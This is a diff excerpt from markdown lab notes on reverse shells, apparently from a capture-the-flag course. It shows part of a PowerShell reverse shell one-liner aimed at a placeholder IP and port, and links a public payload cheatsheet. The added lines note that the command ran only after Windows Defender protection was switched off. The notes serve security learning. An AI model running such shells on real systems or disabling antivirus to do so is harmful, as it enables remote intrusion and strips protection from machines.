@@ -299,7 +299,9 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 For other common reverse shell payloads, [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.
 
 
-### NOTE: I wasn't able to run this `cmd` in windows 
+### NOTE: I wasn't able to run this `cmd` in windows 10 (in my env) unless, I chnged by windows security settings(Virus & threat protection settings)
+
+see: [Turn off Defender antivirus protection in Windows Security](https://support.microsoft.com/en-us/windows/turn-off-defender-antivirus-protection-in-windows-security-99e6004f-c54c-8509-773c-a4d776b77960)
 
 
 1. What command can be used to create a named pipe in Linux?
